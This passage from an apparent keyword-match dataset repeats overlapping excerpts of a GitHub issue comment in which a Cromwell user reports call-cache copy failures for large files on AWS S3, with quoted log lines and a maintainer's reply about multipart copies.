Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:772,Performance,cache,cache,772,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:809,Performance,Cache,Cache,809,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1480,Performance,cache,cache,1480," RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1794,Performance,cache,cache,1794,"ry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1890,Performance,cache,cache,1890,"NE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2141,Performance,perform,perform,2141,"S_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2224,Performance,cache,cached,2224,"S_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxx",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2659,Performance,cache,cache,2659,"c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2688,Performance,cache,cache,2688,"ctor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2767,Performance,cache,cache,2767,":1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2818,Performance,tune,tune,2818,"S_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2938,Performance,cache,cache,2938,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:3087,Performance,Cache,Cache,3087,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:3609,Performance,cache,cacheCopy,3609,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job 